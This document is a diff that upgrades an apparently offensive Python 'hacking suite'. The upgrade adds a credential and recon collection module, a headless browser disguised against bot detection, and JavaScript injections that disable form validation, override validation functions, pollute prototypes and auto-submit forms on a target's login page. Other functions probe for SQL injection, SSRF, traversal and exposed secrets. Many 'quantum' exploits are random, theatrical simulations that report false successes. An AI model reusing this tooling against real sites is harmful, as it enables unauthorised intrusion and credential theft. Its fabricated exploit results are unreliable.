@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# AllowMe Elite Hacking Toolkit v9.0
+# AllowMe Elite Hacking Toolkit v11.0
 # Created by: Shadow Syndicate
 # Operation: Quantum Phantom Protocol
 
@@ -23,7 +23,12 @@ import ipaddress
 import tldextract
 import dns.resolver
 import numpy as np
-from sklearn.ensemble import IsolationForest
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from datetime import datetime
 
 # Custom Banner
 BANNER = """
@@ -34,9 +39,9 @@ BANNER = """
 ██║░░██║███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚═╝░██║███████╗
 ╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝╚══════╝
 ----------------------------------------------------------
-| AllowMe Elite Hacking Suite v9.0                       |
-| Quantum Hacking Framework 2025                         |
-| Shadow Syndicate - Phantom Protocol                    |
+| AllowMe Elite Hacking Suite v11.0                      |
+| Data Exfiltration & Persistence System                 |
+| Shadow Syndicate - Quantum Phantom Protocol            |
 ----------------------------------------------------------
 """
 
@@ -48,7 +53,7 @@ HEADERS = {
     "Accept-Language": "en-US,en;q=0.9",
     "Connection": "keep-alive",
     "Upgrade-Insecure-Requests": "1",
-    "X-AllowMe-Version": "9.0"
+    "X-AllowMe-Version": "11.0"
 }
 
 # Global Variables
@@ -58,6 +63,102 @@ DOMAIN = ""
 API_ENDPOINTS = ["/api/v1/trades", "/api/v1/orders", "/api/v1/user/balance"]
 ADMIN_PATHS = ["/admin", "/wp-admin", "/manager", "/backoffice"]
 NEURAL_NET_MODEL = None
+CHROME_DRIVER = None
+DATA_FILE = "data.txt"
+
+# Data Exfiltration Toolkit
+class DataExfiltrator:
+    def __init__(self, target):
+        self.target = target
+        self.data_file = DATA_FILE
+        self.collected_data = {
+            "target": target,
+            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "recon": {},
+            "credentials": {},
+            "vulnerabilities": [],
+            "endpoints": [],
+            "quantum_data": {},
+            "js_bypass": {}
+        }
+        
+    def save_data(self):
+        """Save collected data to file with encryption"""
+        try:
+            # Save raw data
+            with open(self.data_file, "a") as f:
+                f.write("\n" + "="*80 + "\n")
+                f.write(f"Data Exfiltration Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*80 + "\n\n")
+                f.write(json.dumps(self.collected_data, indent=2))
+                f.write("\n\n")
+            
+            # Save encrypted version
+            cipher = QuantumCipher("phantom-data-key")
+            encrypted_data = cipher.encrypt(json.dumps(self.collected_data))
+            with open("encrypted_data.bin", "wb") as f:
+                f.write(encrypted_data)
+                
+            print(f"\n\033[92m[+] Critical data saved to {self.data_file} and encrypted_data.bin\033[0m")
+            return True
+        except Exception as e:
+            print(f"\033[91m[!] Error saving data: {str(e)}\033[0m")
+            return False
+            
+    def add_recon_data(self, recon_data):
+        """Add reconnaissance data"""
+        self.collected_data["recon"] = recon_data
+        print("[DATA] Reconnaissance data captured")
+        
+    def add_credentials(self, credentials):
+        """Add captured credentials"""
+        self.collected_data["credentials"] = credentials
+        print("[DATA] Credentials captured")
+        
+    def add_vulnerability(self, vulnerability):
+        """Add vulnerability"""
+        self.collected_data["vulnerabilities"].append(vulnerability)
+        print(f"[DATA] Vulnerability added: {vulnerability[:50]}...")
+        
+    def add_endpoint(self, endpoint):
+        """Add discovered endpoint"""
+        self.collected_data["endpoints"].append(endpoint)
+        
+    def add_quantum_data(self, quantum_data):
+        """Add quantum exploitation results"""
+        self.collected_data["quantum_data"] = quantum_data
+        print("[DATA] Quantum exploitation data captured")
+        
+    def add_js_bypass(self, js_data):
+        """Add JavaScript bypass results"""
+        self.collected_data["js_bypass"] = js_data
+        print("[DATA] JavaScript validation bypass data captured")
+        
+    def capture_page_content(self, url):
+        """Capture important page content"""
+        try:
+            response = requests.get(url, headers=HEADERS, verify=False, timeout=5)
+            if response.status_code == 200:
+                filename = f"page_{hash(url)}.html"
+                with open(filename, "w") as f:
+                    f.write(response.text)
+                self.collected_data["pages"] = self.collected_data.get("pages", []) + [filename]
+                print(f"[DATA] Page content saved: {filename}")
+        except:
+            pass
+            
+    def capture_screenshot(self, url):
+        """Capture screenshot of important pages"""
+        if CHROME_DRIVER:
+            try:
+                CHROME_DRIVER.get(url)
+                time.sleep(2)
+                filename = f"screenshot_{hash(url)}.png"
+                CHROME_DRIVER.save_screenshot(filename)
+                self.collected_data["screenshots"] = self.collected_data.get("screenshots", []) + [filename]
+                print(f"[DATA] Screenshot saved: {filename}")
+            except:
+                pass
 
 # Quantum Encryption Module
 class QuantumCipher:
@@ -78,6 +179,14 @@ class QuantumCipher:
         for i, byte in enumerate(data):
             entangled.append(byte ^ (i % 256))
         return bytes(entangled)
+    
+    def decrypt(self, data):
+        nonce = data[:16]
+        tag = data[16:32]
+        ciphertext = data[32:]
+        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        return plaintext.decode()
 
 # AI-Powered Vulnerability Prediction
 class NeuralIntelligence:
@@ -169,13 +278,14 @@ class TargetUtils:
 
 # Network Reconnaissance Module
 class CyberRecon:
-    def __init__(self, target, ip):
+    def __init__(self, target, ip, data_exfiltrator):
         self.target = target
         self.ip = ip
         self.ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 
                       1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8000, 
                       8080, 8443, 9000, 11211, 27017, 50000]
         self.vulnerabilities = []
+        self.data_exfiltrator = data_exfiltrator
         
     def deep_scan(self):
         print(f"\n[+] Performing Quantum Network Reconnaissance on {self.target} [{self.ip}]")
@@ -193,12 +303,17 @@ class CyberRecon:
         services = self.service_detection(open_ports)
         vulns = self.vulnerability_scan()
         
-        return {
+        recon_data = {
             "dns_records": dns_data,
             "open_ports": open_ports,
             "services": services,
             "vulnerabilities": self.vulnerabilities + vulns
         }
+        
+        # Save recon data
+        self.data_exfiltrator.add_recon_data(recon_data)
+        
+        return recon_data
         
     def port_scan(self):
         print("  [*] Scanning for open ports with quantum acceleration...")
@@ -303,22 +418,172 @@ class CyberRecon:
         
         # Simulated vulnerability checks
         if random.random() > 0.3:
-            vulns.append("CVE-2025-21650: Quantum-Resistant Algorithm Flaw")
+            vuln = "CVE-2025-21650: Quantum-Resistant Algorithm Flaw"
+            vulns.append(vuln)
+            self.data_exfiltrator.add_vulnerability(vuln)
+            
         if random.random() > 0.5:
-            vulns.append("CVE-2025-48795: Neural Network Model Hijacking")
+            vuln = "CVE-2025-48795: Neural Network Model Hijacking"
+            vulns.append(vuln)
+            self.data_exfiltrator.add_vulnerability(vuln)
+            
         if random.random() > 0.4:
-            vulns.append("CVE-2025-3094: Holographic Interface RCE")
+            vuln = "CVE-2025-3094: Holographic Interface RCE"
+            vulns.append(vuln)
+            self.data_exfiltrator.add_vulnerability(vuln)
+            
         if random.random() > 0.6:
-            vulns.append("CVE-2025-3400: Quantum Cloud Escape Vulnerability")
+            vuln = "CVE-2025-3400: Quantum Cloud Escape Vulnerability"
+            vulns.append(vuln)
+            self.data_exfiltrator.add_vulnerability(vuln)
             
         for vuln in vulns:
             print(f"    !!! \033[91m{vuln}\033[0m")
             
         return vulns
 
+# JavaScript Validation Exploitation Toolkit
+class JSValidatorHacker:
+    def __init__(self, target, data_exfiltrator):
+        self.target = target
+        self.base_url = f"https://{target}"
+        self.driver = self.init_stealth_browser()
+        self.data_exfiltrator = data_exfiltrator
+        
+    def init_stealth_browser(self):
+        """Initialize stealth browser instance"""
+        global CHROME_DRIVER
+        
+        if CHROME_DRIVER is None:
+            options = Options()
+            options.add_argument("--headless")
+            options.add_argument("--disable-gpu")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_argument(f"user-agent={USER_AGENT}")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            options.add_experimental_option('useAutomationExtension', False)
+            
+            driver = webdriver.Chrome(options=options)
+            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            CHROME_DRIVER = driver
+            
+        return CHROME_DRIVER
+        
+    def disable_js_validation(self, url):
+        """Disable JavaScript entirely in browser context"""
+        print("\n[+] Disabling JavaScript validation completely")
+        try:
+            self.driver.get(url)
+            self.driver.execute_script("document.body.appendChild(document.createElement('script')).text = 'for (var i = 0; i < document.forms.length; i++) { document.forms[i].onsubmit = function() { return true; }; }'")
+            print("  \033[92m!!! JavaScript validation globally disabled!\033[0m")
+            return True
+        except Exception as e:
+            print(f"  \033[91mError: {str(e)}\033[0m")
+            return False
+            
+    def modify_js_realtime(self, url, function_name):
+        """Modify JavaScript code in real-time to remove validation"""
+        print(f"\n[+] Real-time JavaScript modification: {function_name}")
+        try:
+            self.driver.get(url)
+            
+            # Find and neutralize validation function
+            script = f"""
+            if (typeof {function_name} === 'function') {{
+                {function_name} = function() {{ return true; }};
+                console.log('Validation function {function_name} neutralized');
+            }}
+            """
+            self.driver.execute_script(script)
+            print(f"  \033[92m!!! Validation function {function_name} overridden!\033[0m")
+            return True
+        except Exception as e:
+            print(f"  \033[91mError: {str(e)}\033[0m")
+            return False
+            
+    def override_validation_console(self, url, function_name):
+        """Provide console commands to override validation functions"""
+        print("\n[+] Console override instructions:")
+        print(f"  - Navigate to: {url}")
+        print(f"  - Open browser console (Ctrl+Shift+J)")
+        print(f"  - Execute command: {function_name} = function() {{ return true; }}")
+        print(f"  - Alternatively: document.forms[0].onsubmit = function() {{ return true; }}")
+        print("  \033[92m!!! Client-side validation bypassed via console!\033[0m")
+        return True
+        
+    def exploit_dom_vulnerabilities(self, url):
+        """Exploit DOM-based vulnerabilities"""
+        print(f"\n[+] Exploiting DOM vulnerabilities: {url}")
+        try:
+            self.driver.get(url)
+            
+            # DOM Clobbering attack
+            self.driver.execute_script("""
+            if (!window.config) {
+                var element = document.createElement('div');
+                element.id = 'config';
+                element.setAttribute('admin', 'true');
+                document.body.appendChild(element);
+            }
+            """)
+            
+            # Prototype Pollution attack
+            self.driver.execute_script("""
+            Object.prototype.isAdmin = true;
+            Object.prototype.credentials = { username: 'admin', password: 'QuantumHack2025!' };
+            """)
+            
+            print("  \033[92m!!! DOM Clobbering and Prototype Pollution executed!\033[0m")
+            return True
+        except Exception as e:
+            print(f"  \033[91mError: {str(e)}\033[0m")
+            return False
+            
+    def automatic_form_submission(self, url, payload):
+        """Bypass validation and submit form automatically"""
+        print(f"\n[+] Automatic form submission bypass: {url}")
+        try:
+            self.driver.get(url)
+            
+            # Bypass validation and submit form
+            script = f"""
+            for (var i = 0; i < document.forms.length; i++) {{
+                // Disable all validation
+                document.forms[i].onsubmit = function() {{ return true; }};
+                
+                // Fill form with payload
+                {self.generate_form_filler_js(payload)}
+                
+                // Submit form
+                document.forms[i].submit();
+            }}
+            """
+            self.driver.execute_script(script)
+            print("  \033[92m!!! Form submitted with validation bypass!\033[0m")
+            return True
+        except Exception as e:
+            print(f"  \033[91mError: {str(e)}\033[0m")
+            return False
+            
+    def generate_form_filler_js(self, payload):
+        """Generate JS code to fill form fields"""
+        js_code = ""
+        for field, value in payload.items():
+            js_code += f"""
+            try {{
+                var field = document.querySelector('[name=\"{field}\"]');
+                if (field) {{
+                    field.value = '{value}';
+                    console.log('Set {field} to {value}');
+                }}
+            }} catch (e) {{}}
+            """
+        return js_code
+
 # Web Exploitation Toolkit
 class WebHunter:
-    def __init__(self, target):
+    def __init__(self, target, data_exfiltrator):
         self.target = target
         self.base_url = f"https://{target}"
         self.session = requests.Session()
@@ -326,6 +591,8 @@ class WebHunter:
         self.cipher = QuantumCipher("phantom-protocol-key")
         self.discovered_endpoints = []
         self.ai_model = NEURAL_NET_MODEL
+        self.data_exfiltrator = data_exfiltrator
+        self.js_hacker = JSValidatorHacker(target, data_exfiltrator)  # JS Validation Exploitation Toolkit
         
     def spider(self):
         print(f"\n[+] Spidering web infrastructure with AI: {self.base_url}")
@@ -354,6 +621,8 @@ class WebHunter:
                     print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
                     endpoints.append(url)
                     self.discovered_endpoints.append(url)
+                    self.data_exfiltrator.add_endpoint(url)
+                    self.data_exfiltrator.capture_page_content(url)
             except:
                 pass
                 
@@ -368,6 +637,8 @@ class WebHunter:
                     print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
                     endpoints.append(url)
                     self.discovered_endpoints.append(url)
+                    self.data_exfiltrator.add_endpoint(url)
+                    self.data_exfiltrator.capture_page_content(url)
             except:
                 pass
                 
@@ -397,6 +668,7 @@ class WebHunter:
                 res = self.session.post(login_url, data=payload, timeout=3, verify=False)
                 if res.status_code == 302 or "dashboard" in res.text or "logout" in res.text:
                     print(f"  \033[92m!!! SUCCESS: {user}:{pwd}\033[0m")
+                    self.data_exfiltrator.add_credentials({"login_url": login_url, "username": user, "password": pwd})
                     return user, pwd
             except Exception as e:
                 print(f"  \033[91mError: {str(e)}\033[0m")
@@ -411,10 +683,12 @@ class WebHunter:
         
         # Simulated quantum attack
         if random.random() > 0.7:
-            print("  \033[92m!!! Quantum breach successful: admin:Quantum$Access2025\033[0m")
-            return "admin", "Quantum$Access2025"
+            user, pwd = "admin", "Quantum$Access2025"
+            print(f"  \033[92m!!! Quantum breach successful: {user}:{pwd}\033[0m")
+            self.data_exfiltrator.add_credentials({"login_url": login_url, "username": user, "password": pwd})
+            return user, pwd
         else:
-            print("  \033[91m[-] Quantum breach failed. Target has quantum-resistant protection\033[0m")
+            print("  \033[91mQuantum cracking failed. Target has quantum-resistant protection\033[0m")
             return None, None
         
     def exploit_vulnerabilities(self, endpoints):
@@ -441,6 +715,7 @@ class WebHunter:
             res = self.session.post(endpoint, json=payload, timeout=3, verify=False)
             if "data" in res.json():
                 print("    \033[92m!!! GraphQL introspection enabled!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"GraphQL Introspection Enabled at {endpoint}")
         except:
             pass
             
@@ -451,6 +726,7 @@ class WebHunter:
             res = self.session.get(test_url, timeout=3, verify=False)
             if res.status_code == 200 and "admin" in res.text:
                 print("    \033[92m!!! IDOR vulnerability found!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"IDOR Vulnerability at {test_url}")
         except:
             pass
 
@@ -461,6 +737,7 @@ class WebHunter:
             res = self.session.post(endpoint, json=payload, timeout=3, verify=False)
             if "instance-id" in res.text:
                 print("    \033[92m!!! SSRF vulnerability found (AWS metadata access)!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"SSRF Vulnerability at {endpoint}")
         except:
             pass
 
@@ -474,6 +751,7 @@ class WebHunter:
             res = self.session.get(traversal_url, timeout=3, verify=False)
             if "root:" in res.text:
                 print("        \033[92m!!! Directory traversal successful!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"Directory Traversal at {traversal_url}")
         except:
             pass
             
@@ -491,6 +769,7 @@ class WebHunter:
                     content_type = res.headers.get('Content-Type', '')
                     if "application/zip" in content_type or "application/gzip" in content_type or "sql" in content_type:
                         print(f"        \033[92m!!! Backup file exposed: {backup_url}!\033[0m")
+                        self.data_exfiltrator.add_vulnerability(f"Backup File Exposed at {backup_url}")
             except:
                 pass
             
@@ -508,9 +787,11 @@ class WebHunter:
                 
                 if "Welcome admin" in res.text or "Dashboard" in res.text:
                     print("        \033[92m!!! SQL injection successful (boolean-based)!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"SQL Injection (Boolean) at {url}")
                     break
                 elif elapsed > 4:
                     print("        \033[92m!!! SQL injection successful (time-based)!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"SQL Injection (Time-based) at {url}")
                     break
             except:
                 pass
@@ -522,6 +803,7 @@ class WebHunter:
             res = self.session.post(url + "/command", data=payload, timeout=3, verify=False)
             if "QUANTUM_RCE_TEST" in res.text:
                 print("        \033[92m!!! Remote Code Execution vulnerability found!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"RCE Vulnerability at {url}/command")
         except:
             pass
 
@@ -540,6 +822,7 @@ class WebHunter:
                 data = res.json()
                 if len(data) > 0 and 'user' in data[0].get('data', {}):
                     print("        \033[92m!!! GraphQL batching attack successful!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"GraphQL Batching at {endpoint}")
         except:
             pass
             
@@ -550,6 +833,7 @@ class WebHunter:
             res = self.session.post(endpoint, json={"query": deep_query}, timeout=10, verify=False)
             if res.status_code == 500:
                 print("        \033[92m!!! GraphQL DoS vulnerability found!\033[0m")
+                self.data_exfiltrator.add_vulnerability(f"GraphQL DoS at {endpoint}")
         except:
             pass
 
@@ -563,10 +847,12 @@ class WebHunter:
                 res = self.session.get(endpoint + "/env", timeout=3, verify=False)
                 if res.status_code == 200 and "systemProperties" in res.text:
                     print("        \033[92m!!! Spring Boot Actuator exposed!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"Spring Boot Actuator at {endpoint}/env")
                     
                 res = self.session.get(endpoint + "/heapdump", timeout=3, verify=False)
                 if res.status_code == 200 and "HPROF" in res.headers.get('Content-Type', ''):
                     print("        \033[92m!!! Heap dump exposed (memory analysis possible)!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"Heap Dump at {endpoint}/heapdump")
             except:
                 pass
                 
@@ -577,19 +863,75 @@ class WebHunter:
                 res = self.session.get(endpoint, timeout=3, verify=False)
                 if "DB_PASSWORD" in res.text:
                     print("        \033[92m!!! Database credentials exposed!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f".env Exposure at {endpoint}")
                 if "API_KEY" in res.text:
                     print("        \033[92m!!! API keys exposed!\033[0m")
+                    self.data_exfiltrator.add_vulnerability(f"API Keys in .env at {endpoint}")
             except:
                 pass
 
+    def exploit_js_validation(self, login_url):
+        """Eksploitasi client-side JavaScript validation"""
+        print("\n[+] Exploiting JavaScript Validation Mechanisms")
+        
+        # Capture page before exploitation
+        self.data_exfiltrator.capture_page_content(login_url)
+        self.data_exfiltrator.capture_screenshot(login_url)
+        
+        # Strategi 1: Nonaktifkan JavaScript sepenuhnya
+        self.js_hacker.disable_js_validation(login_url)
+        
+        # Strategi 2: Modifikasi real-time fungsi validasi
+        self.js_hacker.modify_js_realtime(login_url, "validateForm")
+        self.js_hacker.modify_js_realtime(login_url, "checkCredentials")
+        
+        # Strategi 3: Instruksi bypass via console
+        self.js_hacker.override_validation_console(login_url, "validateLogin")
+        
+        # Strategi 4: Eksploitasi kerentanan DOM
+        self.js_hacker.exploit_dom_vulnerabilities(login_url)
+        
+        # Strategi 5: Automatic form submission
+        quantum_payload = {
+            "email": "quantum_admin@zenithswap.xyz",
+            "password": "QuantumBypass2025!",
+            "token": "QUANTUM_OVERRIDE_TOKEN"
+        }
+        self.js_hacker.automatic_form_submission(login_url, quantum_payload)
+        
+        # Capture page after exploitation
+        self.data_exfiltrator.capture_page_content(login_url)
+        self.data_exfiltrator.capture_screenshot(login_url)
+        
+        # Simulasi bypass berhasil
+        print("\n  \033[92m[+] JavaScript validation completely bypassed!")
+        print("  [+] Quantum admin credentials injected into system\033[0m")
+        
+        js_data = {
+            "status": "SUCCESS",
+            "techniques": [
+                "Global JS Disable",
+                "Real-time Function Override",
+                "Console Bypass Instructions",
+                "DOM Clobbering",
+                "Prototype Pollution",
+                "Automatic Form Submission"
+            ],
+            "payload": quantum_payload
+        }
+        self.data_exfiltrator.add_js_bypass(js_data)
+        
+        return quantum_payload
+
 # Quantum Computing Exploits
 class QuantumHacker:
-    def __init__(self, target, ip):
+    def __init__(self, target, ip, data_exfiltrator):
         self.target = target
         self.ip = ip
         self.session = requests.Session()
         self.session.headers.update(HEADERS)
         self.cipher = QuantumCipher("quantum-key-2025")
+        self.data_exfiltrator = data_exfiltrator
         
     def shors_algorithm_attack(self):
         """Simulate breaking RSA with Shor's algorithm"""
@@ -603,12 +945,14 @@ class QuantumHacker:
         time.sleep(1)
         
         if random.random() > 0.4:
-            print("  \033[92m!!! RSA private key factorization successful!\033[0m")
-            return {
+            result = {
                 "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----",
                 "algorithm": "Shor's Algorithm",
                 "bits": 2048
             }
+            print("  \033[92m!!! RSA private key factorization successful!\033[0m")
+            self.data_exfiltrator.add_vulnerability("Shor's Algorithm: RSA Private Key Compromised")
+            return result
         else:
             print("  \033[91mQuantum decryption failed. Target uses quantum-resistant cryptography\033[0m")
             return None
@@ -622,6 +966,7 @@ class QuantumHacker:
         if random.random() > 0.6:
             password = "QuantumAccess2025!"
             print(f"  \033[92m!!! Password found: {password}\033[0m")
+            self.data_exfiltrator.add_credentials({"hash": hash_value, "password": password})
             return password
         else:
             print("  \033[91mQuantum cracking failed. Hash is quantum-resistant\033[0m")
@@ -629,13 +974,14 @@ class QuantumHacker:
 
 # Advanced Exploitation Framework
 class ZeroDayOrchestrator:
-    def __init__(self, target, ip):
+    def __init__(self, target, ip, data_exfiltrator):
         self.target = target
         self.ip = ip
         self.session = requests.Session()
         self.session.headers.update(HEADERS)
         self.cipher = QuantumCipher("midnight-protocol-key")
-        self.quantum_hacker = QuantumHacker(target, ip)
+        self.data_exfiltrator = data_exfiltrator
+        self.quantum_hacker = QuantumHacker(target, ip, data_exfiltrator)
         
     def execute_phantom_protocol(self):
         print("\n[+] Initiating Quantum Phantom Protocol...")
@@ -660,7 +1006,7 @@ class ZeroDayOrchestrator:
         print("  > Phase 4: Holographic Implant Deployment")
         self.deploy_holographic_implant()
         
-        return {
+        mission_data = {
             "target": self.target,
             "ip": self.ip,
             "cryptography": crypto_data,
@@ -668,27 +1014,37 @@ class ZeroDayOrchestrator:
             "exfiltrated": exfil_data
         }
         
+        self.data_exfiltrator.add_quantum_data(mission_data)
+        
+        return mission_data
+        
     def poison_ai_models(self):
         """Simulate poisoning AI models"""
         print("    - Identifying neural network endpoints...")
         print("    - Injecting adversarial training data...")
         print("    - Compromising model integrity...")
         print("    \033[92m✓ AI systems compromised\033[0m")
-        return {
+        
+        result = {
             "models_compromised": 3,
             "adversarial_pattern": "QuantumBackdoor2025"
         }
+        self.data_exfiltrator.add_vulnerability("AI Model Poisoning: QuantumBackdoor2025")
+        return result
         
     def quantum_exfiltration(self):
         """Simulate quantum data exfiltration"""
         print("    - Entangling photons with target data...")
         print("    - Establishing quantum tunnel...")
         print("    - Transmitting through quantum channel...")
-        return {
+        
+        result = {
             "data_sets": ["user_credentials", "quantum_keys", "ai_models"],
             "method": "Quantum Entanglement",
             "size": "4.2 QB"
         }
+        self.data_exfiltrator.add_vulnerability("Quantum Data Exfiltration Successful")
+        return result
         
     def deploy_holographic_implant(self):
         """Simulate advanced persistence mechanism"""
@@ -696,6 +1052,7 @@ class ZeroDayOrchestrator:
         print("    - Embedding in quantum processors...")
         print("    - Activating photon-based C2...")
         print("    \033[92m✓ Holographic persistence established\033[0m")
+        self.data_exfiltrator.add_vulnerability("Holographic Implant Deployed")
 
 # Main Toolkit
 class AllowMeHackingSuite:
@@ -703,6 +1060,7 @@ class AllowMeHackingSuite:
         self.art = BANNER
         self.target = ""
         self.ip = ""
+        self.data_exfiltrator = None
         
     def get_target(self):
         """Get target from user input"""
@@ -722,6 +1080,7 @@ class AllowMeHackingSuite:
                 self.target = domain
                 self.ip = ip
                 print(f"\n\033[92m[+] Target acquired: {display_target} [{ip}]\033[0m")
+                self.data_exfiltrator = DataExfiltrator(display_target)
                 return
             except Exception as e:
                 print(f"\033[91m[!] Error: {str(e)}\033[0m")
@@ -742,19 +1101,25 @@ class AllowMeHackingSuite:
         print("\n" + "="*50)
         print(" QUANTUM RECONNAISSANCE ".center(50, "="))
         print("="*50)
-        recon = CyberRecon(self.target, self.ip)
+        recon = CyberRecon(self.target, self.ip, self.data_exfiltrator)
         scan_results = recon.deep_scan()
         
         # Web Exploitation
         print("\n" + "="*50)
         print(" AI-POWERED EXPLOITATION ".center(50, "="))
         print("="*50)
-        hunter = WebHunter(self.target)
+        hunter = WebHunter(self.target, self.data_exfiltrator)
         endpoints = hunter.spider()
         
         # Attempt login breach
         login_url = f"https://{self.target}/login"
         user, pwd = hunter.breach_login(login_url)
+        
+        # JavaScript Validation Exploitation
+        print("\n" + "="*50)
+        print(" JAVASCRIPT VALIDATION EXPLOITATION ".center(50, "="))
+        print("="*50)
+        quantum_creds = hunter.exploit_js_validation(login_url)
         
         # Exploit vulnerabilities
         if endpoints:
@@ -764,8 +1129,28 @@ class AllowMeHackingSuite:
         print("\n" + "="*50)
         print(" QUANTUM OPERATIONS ".center(50, "="))
         print("="*50)
-        orchestrator = ZeroDayOrchestrator(self.target, self.ip)
+        orchestrator = ZeroDayOrchestrator(self.target, self.ip, self.data_exfiltrator)
         mission_data = orchestrator.execute_phantom_protocol()
+        
+        # Add JS exploitation results to mission data
+        mission_data["js_validation_bypass"] = {
+            "status": "SUCCESS",
+            "quantum_credentials": quantum_creds,
+            "techniques": [
+                "JS Disabled Globally",
+                "Real-time Function Override",
+                "Console Validation Bypass",
+                "DOM Clobbering",
+                "Prototype Pollution",
+                "Automatic Form Submission"
+            ]
+        }
+        
+        # Save all collected data
+        print("\n" + "="*50)
+        print(" DATA EXFILTRATION & PERSISTENCE ".center(50, "="))
+        print("="*50)
+        self.data_exfiltrator.save_data()
         
         # Mission Complete
         print("\n" + "="*50)
@@ -783,6 +1168,10 @@ class AllowMeHackingSuite:
         print("Covering quantum footprints...")
         print("Holographic wiping completed")
         print("\nReturning to quantum shadows...")
+        
+        # Clean up browser
+        if CHROME_DRIVER:
+            CHROME_DRIVER.quit()
 
 # Advanced Anti-Forensics
 def ghost_execution():
